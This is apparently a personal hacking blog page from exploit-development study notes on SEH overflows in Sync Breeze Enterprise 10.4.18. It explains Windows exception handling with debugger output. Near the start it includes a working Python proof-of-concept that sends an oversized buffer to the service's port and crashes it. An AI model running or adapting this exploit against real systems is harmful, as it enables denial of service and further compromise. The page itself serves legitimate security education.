@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+        <script>
+            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
+        </script>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='http://localhost:1313/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='http://localhost:1313/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='http://localhost:1313/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='http://localhost:1313/favicon.png'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+        purpurina - a place for hacking
+    </title>
+
+    
+    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
+<meta name="author" content="jaco" />
+
+    
+    
+        <meta name="description" content="blic-exploit&#34;&gt;Analyzing public exploit&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Vulnerable Binary: Sync Breeze Enterprise v10.4.18&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s try to use the public exploit to trigger a crash:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python  &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; struct &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pack  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;192.168.122.113&amp;#34;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9121&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; inputBuffer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x41&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; size  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x75\x19\xba\xab&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;&#43;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x03\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;&#43;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x40\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;&#43;=&lt;/span&gt; pack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;, len(inputBuffer))  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;&#43;=&lt;/span&gt; pack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;, len(inputBuffer))  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;&#43;=&lt;/span&gt; pack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;, inputBuffer[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; header &lt;span style=&#34;color:#f92672&#34;&gt;&#43;&lt;/span&gt; inputBuffer  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sending evil buffer...&amp;#34;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((server, port))  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(buf)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Done!&amp;#34;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Could not connect!&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When we execute the exploit, we see that the EAX register is overwritten, but not the EIP&amp;hellip;
+Seems like at this moment the EIP register is not directly under our control.
+Also, there is some data in the stack that contains part of our payload:
+&lt;img src=&#34;content/images/post_images/osed_2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='purpurina - a place for hacking' />
+
+    <meta property="og:title" content="" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="jaco" />
+    <meta
+        property="article:published_time"
+        content='0001-01-01T00:00:00Z&#43;0000' />
+    
+    <meta property="og:url" content="http://localhost:1313/posts/osed_seh_1/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta property="og:description" content="&lt;h1 id=&#34;analyzing-public-exploit&#34;&gt;Analyzing public exploit&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Vulnerable Binary: Sync Breeze Enterprise v10.4.18&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s try to use" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/osed_seh_1/" />
+
+
+    <meta name="twitter:title" content="" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta name="twitter:description" content="&lt;h1 id=&#34;analyzing-public-exploit&#34;&gt;Analyzing public exploit&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Vulnerable Binary: Sync Breeze Enterprise v10.4.18&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Let&amp;rsquo;s try to use" />
+    
+
+<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="http://localhost:1313/">
+                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="http://localhost:1313/">Home</a></li>
+        
+            <li><a href="http://localhost:1313/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="http://localhost:1313/about/">About</a></li>
+        
+        
+            <li><a href="http://localhost:1313/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1></h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    0001-01-01
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="analyzing-public-exploit">Analyzing public exploit</h1>
+<ul>
+<li>Vulnerable Binary: Sync Breeze Enterprise v10.4.18</li>
+</ul>
+<p>Let&rsquo;s try to use the public exploit to trigger a crash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python  </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:  
+</span></span><span style="display:flex;"><span> server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.122.113&#34;</span>  
+</span></span><span style="display:flex;"><span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9121</span>  
+</span></span><span style="display:flex;"><span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span>  
+</span></span><span style="display:flex;"><span> inputBuffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> size  
+</span></span><span style="display:flex;"><span> header <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\x19\xba\xab</span><span style="color:#e6db74">&#34;</span>  
+</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>  
+</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x40\x00\x00</span><span style="color:#e6db74">&#34;</span>  
+</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, len(inputBuffer))  
+</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, len(inputBuffer))  
+</span></span><span style="display:flex;"><span> header <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, inputBuffer[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])  
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> header <span style="color:#f92672">+</span> inputBuffer  
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)  
+</span></span><span style="display:flex;"><span> s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)  
+</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>connect((server, port))  
+</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>send(buf)  
+</span></span><span style="display:flex;"><span> s<span style="color:#f92672">.</span>close()  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Done!&#34;</span>)  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>error:  
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;Could not connect!&#34;</span>)
+</span></span></code></pre></div><p>When we execute the exploit, we see that the EAX register is overwritten, but not the EIP&hellip;
+Seems like at this moment the EIP register is not directly under our control.
+Also, there is some data in the stack that contains part of our payload:
+<img src="content/images/post_images/osed_2.png" alt=""></p>
+<p>Let&rsquo;s see all the registers and confirm that EAX is the only register under our control:
+<img src="content/images/post_images/osed_2_1.png" alt=""></p>
+<p>Let&rsquo;s examine the crash. The crash says:</p>
+<pre tabindex="0"><code>(113c.1164): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+</code></pre><p>This means that the debugger intercepted a first chance exception, which is like a unexpected error.
+Let&rsquo;s handle it continuing the program by pressing &ldquo;g&rdquo;.
+We can see that we got another access violation, now controlling the EIP.
+<img src="content/images/post_images/osed_2_2.png" alt=""></p>
+<p>To understand how this exploit worked and how we got control over the EIP, we have to talk about the SEH.</p>
+<h1 id="seh">SEH</h1>
+<p>We must understand what happens when <strong>an exception occurs inside an application</strong>.
+As mentioned in the previous section, exceptions are unexpected events that occur during normal program execution.
+There are two kinds of exceptions: <strong>hardware exceptions and software exceptions</strong>.</p>
+<ul>
+<li>Hardware exceptions are initiated by the CPU. We encountered a typical hardware exception when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address. Hardware exceptions are exceptions that are not made by the programmer, but occur when the logic in the assembly code fails.</li>
+<li>On the other hand, software exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. For example, a software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument. They are exceptions but controlled in the software layer.</li>
+</ul>
+<p><strong>Normally the exception handling is programmed via try/except blocks.</strong> In Windows, when doing a try/except block, the code will leverage the SEH (Structure Exception Handling) implemented by the Windows OS to handle the unexpected event.</p>
+<p>SEH is implemented in <strong>the operative system (Windows)</strong> to manage <strong>what to do when an unexpected action occurs in the execution of a thread.</strong> When a thread faults, the OS calls a set of functions, called <strong>function handlers</strong>, which can correct the exception, provide more information about the unexpected condition, etc.
+The <strong>exception handlers are user-defined and created during the creation of the try/except code blocks.</strong>
+So, the SEH is the mechanism created by the OS that executes our exception handlers (created by developers) when an exception fails.
+<strong>Important note: There is a special DEFAULT exception handler which is defined by the OS, the rest are programmed by the developer.</strong></p>
+<p>When an unexpected event occurs, the OS must locates the correct exception handler.
+Note that the exception handling occurs <strong>at a thread level.</strong>
+Each thread in a program can be identified by a TEB (Thread Environment Block) structure, a struct that stores important information about such thread.
+Each time a try block is found during the execution of a thread, a pointer to the <strong>corresponding exception handler is saved on the stack in the <code>_EXCEPTION_REGISTRATION_RECORD</code> structure</strong>.
+As there might be different try blocks chained in the single thread (a try inside a try), these structures are connected in the stack <strong>in a linked list</strong>, as the following image details:
+<img src="content/images/post_images/osed_2_3.png" alt=""></p>
+<p>In the case that the exception occurs, the OS inspects the TEB structure of the thread that has the exception and retrieves a pointer (<strong>ExceptionList</strong>) to the linked list of <code>_EXCEPTION_REGISTRATION_RECORD</code>.
+How does the OS retrieves information of the TEB? Well, the FS register at offset 0 (<code>fs:[0]</code>) stores a pointer to the TEB structure of that thread.
+After retrieving the Exception List, the OS will walk and <strong>invoke each of the exception handler functions stored in the stack until one of them can deal with the unexpected event.</strong> If none of the defined functions can handle the exception, the OS invokes the <strong>default exception handler, which is always the last node in the linked list. This exception handler terminates the current process (or thread if the application is a system service)</strong>.</p>
+<p>TL; DR, the TEB of a thread has a pointer called ExceptionList that points to the linked list of <code>_EXCEPTION_REGISTRATION_RECORD</code> in the stack. The pointer is to the first exception, as the rest are chained by following the &ldquo;Next&rdquo; attribute of the exception. Each of these handlers is called to manage the exception when it occurs. If none of then can manage the exception, the program exits or the thread ends, in case of a service.</p>
+<h2 id="seh-internals">SEH internals</h2>
+<p>Let&rsquo;s analyze the TEB structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt nt<span style="color:#f92672">!</span>_TEB
+</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_TEB
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> NtTib            : _NT_TIB
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x01c</span> EnvironmentPointer : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x020</span> ClientId         : _CLIENT_ID
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x028</span> ActiveRpcHandle  : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x034</span> LastErrorValue   : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x038</span> CountOfOwnedCriticalSections : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x03c</span> CsrClientThread  : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x040</span> Win32ThreadInfo  : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x044</span> User32Reserved   : [<span style="color:#ae81ff">26</span>] Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0ac</span> UserReserved     : [<span style="color:#ae81ff">5</span>] Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c0</span> WOW32Reserved    : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c4</span> CurrentLocale    : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0c8</span> FpSoftwareStatusRegister : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x0cc</span> ReservedForDebuggerInstrumentation : [<span style="color:#ae81ff">16</span>] Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x10c</span> SystemReserved1  : [<span style="color:#ae81ff">26</span>] Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x174</span> PlaceholderCompatibilityMode : Char
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x175</span> PlaceholderHydrationAlwaysExplicit : UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x176</span> PlaceholderReserved : [<span style="color:#ae81ff">10</span>] Char
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x180</span> ProxiedProcessId : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x184</span> _ActivationStack : _ACTIVATION_CONTEXT_STACK
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x19c</span> WorkingOnBehalfTicket : [<span style="color:#ae81ff">8</span>] UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1a4</span> ExceptionCode    : Int4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1ac</span> InstrumentationCallbackSp : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b0</span> InstrumentationCallbackPreviousPc : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b4</span> InstrumentationCallbackPreviousSp : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b8</span> InstrumentationCallbackDisabled : UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b9</span> SpareBytes       : [<span style="color:#ae81ff">23</span>] UChar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d0</span> TxFsContext      : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6b4</span> RealClientId     : _CLIENT_ID
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c0</span> GdiClientPID     : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c4</span> GdiClientTID     : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x6cc</span> Win32ClientInfo  : [<span style="color:#ae81ff">62</span>] Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x7c4</span> glDispatchTable  : [<span style="color:#ae81ff">233</span>] Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xb68</span> glReserved1      : [<span style="color:#ae81ff">29</span>] Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbdc</span> glReserved2      : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbe0</span> glSectionInfo    : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbe4</span> glSection        : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbe8</span> glTable          : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbec</span> glCurrentRC      : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbf0</span> glContext        : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbf4</span> LastStatusValue  : Uint4B
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xbf8</span> StaticUnicodeString : _UNICODE_STRING
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xc00</span> StaticUnicodeBuffer : [<span style="color:#ae81ff">261</span>] Wchar
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xe0c</span> DeallocationStack : Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xe10</span> TlsSlots         : [<span style="color:#ae81ff">64</span>] Ptr32 Void
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf10</span> TlsLinks         : _LIST_ENTRY
+</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0xf18</span> Vdm              : Ptr32 Void
